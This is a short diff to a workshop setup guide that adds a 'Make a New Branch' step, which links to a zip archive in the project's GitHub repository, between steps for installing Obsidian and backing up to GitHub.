@@ -8,6 +8,8 @@
 	- https://desktop.github.com/
 - [STEP 2] Install Obsidian
 	- https://obsidian.md/download
+- [STEP 3] Make a New Branch
+ 	- https://github.com/tiago-rorke/how-to-undo/raw/main/how_to_undo_cartaz.zip
 - [STEP 4] Backup to GitHub
 	- https://github.com/signup
 - [STEP 5] "Food to Fork" - add your own recipe to the repository to share
